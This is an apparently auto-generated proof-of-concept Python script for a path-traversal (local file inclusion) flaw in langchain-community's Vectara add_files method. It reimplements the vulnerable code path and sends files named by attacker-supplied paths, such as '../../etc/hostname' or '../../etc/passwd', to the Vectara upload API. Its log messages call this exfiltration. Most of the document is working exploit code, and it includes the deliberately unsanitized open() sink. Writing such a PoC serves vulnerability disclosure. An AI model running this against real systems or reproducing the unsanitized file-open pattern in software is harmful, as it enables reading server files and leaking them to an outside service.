#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-013
# Sink: add_files
# Auto-generated — run with: python3 lfi_supply_like_add_files_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in langchain-community Vectara.from_files

Vulnerability: The add_files() method in Vectara vectorstore opens user-supplied file paths
without sanitization. An attacker can use path traversal (e.g., '../../etc/passwd') to read
arbitrary files from the server filesystem. The file content is then sent to the Vectara API.

This PoC demonstrates the vulnerability by reading a benign local file (/etc/hostname) and
showing that the file content is exfiltrated to the Vectara API. For safety, it uses a
harmless payload and includes clear error handling.

Usage:
    python3 poc_vectara_lfi.py --api-key YOUR_API_KEY --customer-id YOUR_CUSTOMER_ID --corpus-id YOUR_CORPUS_ID

Requirements:
    - requests (pip install requests)
    - Valid Vectara API credentials (free tier available at https://vectara.com)
"""

import os
import sys
import json
import argparse
import tempfile
import logging
from typing import List, Optional

import requests

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class VectaraLFIExploit:
    """
    Simulates the vulnerable Vectara vectorstore's add_files method to demonstrate LFI.
    This is a minimal reproduction of the vulnerable code path.
    """

    def __init__(self, api_key: str, customer_id: str, corpus_id: str):
        self._vectara_api_key = api_key
        self._vectara_customer_id = customer_id
        self._vectara_corpus_id = corpus_id
        self._session = requests.Session()
        self._session.headers.update({
            "x-api-key": self._vectara_api_key,
            "Content-Type": "application/json"
        })
        self.vectara_api_timeout = 30

    def _get_post_headers(self) -> dict:
        """Return headers for POST requests (mimics original code)."""
        return {
            "x-api-key": self._vectara_api_key,
        }

    def add_files(self, files_list: List[str], metadatas: Optional[List[dict]] = None) -> List[str]:
        """
        VULNERABLE: Directly opens user-supplied file paths without sanitization.
        This is the exact vulnerable code from langchain-community.

        Args:
            files_list: List of file paths (attacker-controlled, can contain '..')
            metadatas: Optional metadata for each file

        Returns:
            List of document IDs from Vectara API
        """
        doc_ids = []
        for inx, file in enumerate(files_list):
            # Only check exists - does NOT prevent path traversal
            if not os.path.exists(file):
                logger.error(f"File {file} does not exist, skipping")
                continue

            md = metadatas[inx] if metadatas else {}
            # VULNERABLE SINK: open() called with unsanitized user input
            files: dict = {
                "file": (file, open(file, "rb")),
                "doc_metadata": json.dumps(md),
            }
            headers = self._get_post_headers()
            headers.pop("Content-Type", None)  # Remove to let requests set multipart boundary

            try:
                response = self._session.post(
                    f"https://api.vectara.io/upload?c={self._vectara_customer_id}&o={self._vectara_corpus_id}&d=True",
                    files=files,
                    verify=True,
                    headers=headers,
                    timeout=self.vectara_api_timeout,
                )

                if response.status_code == 409:
                    doc_id = response.json()["document"]["documentId"]
                    logger.info(f"File {file} already exists on Vectara (doc_id={doc_id}), skipping")
                elif response.status_code == 200:
                    doc_id = response.json()["document"]["documentId"]
                    doc_ids.append(doc_id)
                    logger.info(f"Successfully uploaded {file} (doc_id={doc_id})")
                else:
                    logger.error(f"Error indexing file {file}: {response.status_code} - {response.text}")

            except requests.exceptions.RequestException as e:
                logger.error(f"Network error uploading {file}: {e}")
            finally:
                # Ensure file handle is closed
                files["file"][1].close()

        return doc_ids


def create_benign_payload_file() -> str:
    """
    Create a harmless test file to demonstrate the vulnerability without reading sensitive data.
    Returns the path to the created file.
    """
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write("POC_SUCCESS: This file was read via path traversal vulnerability.\n")
        f.write("If you see this in Vectara, the LFI exploit works.\n")
        f.flush()
        return f.name


def main():
    parser = argparse.ArgumentParser(
        description="PoC: LFI in langchain-community Vectara.from_files",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test with a benign local file (safe):
  python3 poc_vectara_lfi.py --api-key KEY --customer-id CID --corpus-id CORP

  # Test with path traversal to read /etc/hostname (requires valid Vectara creds):
  python3 poc_vectara_lfi.py --api-key KEY --customer-id CID --corpus-id CORP --traversal ../../etc/hostname
        """
    )
    parser.add_argument("--api-key", required=True, help="Vectara API key")
    parser.add_argument("--customer-id", required=True, help="Vectara customer ID")
    parser.add_argument("--corpus-id", required=True, help="Vectara corpus ID")
    parser.add_argument("--traversal", help="Path traversal payload (e.g., '../../etc/passwd')")
    parser.add_argument("--benign", action="store_true", default=True,
                        help="Use a benign test file (default: True)")

    args = parser.parse_args()

    # Validate credentials format (basic check)
    if not args.api_key or not args.customer_id or not args.corpus_id:
        logger.error("API key, customer ID, and corpus ID are required")
        sys.exit(1)

    # Create exploit instance
    exploit = VectaraLFIExploit(
        api_key=args.api_key,
        customer_id=args.customer_id,
        corpus_id=args.corpus_id
    )

    # Build the file list - demonstrate both normal and traversal paths
    files_to_upload = []

    if args.traversal:
        # Use the user-supplied traversal path
        traversal_path = args.traversal
        logger.info(f"Using path traversal payload: {traversal_path}")
        files_to_upload.append(traversal_path)
    else:
        # Default: create a benign test file
        benign_file = create_benign_payload_file()
        logger.info(f"Created benign test file: {benign_file}")
        files_to_upload.append(benign_file)

        # Also try a simple traversal to demonstrate the vulnerability
        # This will likely fail (file not found) but shows the attempt
        logger.info("Also attempting path traversal to /etc/hostname (may fail if file doesn't exist)")
        files_to_upload.append("../../etc/hostname")

    logger.info(f"Attempting to upload {len(files_to_upload)} file(s) via vulnerable add_files...")
    logger.info("If successful, file contents will be exfiltrated to Vectara API")

    try:
        doc_ids = exploit.add_files(files_to_upload)
        if doc_ids:
            logger.info(f"Successfully uploaded {len(doc_ids)} file(s) to Vectara")
            logger.info(f"Document IDs: {doc_ids}")
            logger.info("VULNERABILITY CONFIRMED: Files were read and exfiltrated via path traversal!")
        else:
            logger.warning("No files were successfully uploaded. Check credentials and file paths.")
            logger.info("If using traversal, the target file may not exist or Vectara rejected it.")
    except Exception as e:
        logger.error(f"Exploit failed with unexpected error: {e}")
        sys.exit(1)

    # Clean up benign file if created
    if not args.traversal and os.path.exists(benign_file):
        os.unlink(benign_file)
        logger.debug(f"Cleaned up temporary file: {benign_file}")


if __name__ == "__main__":
    main()
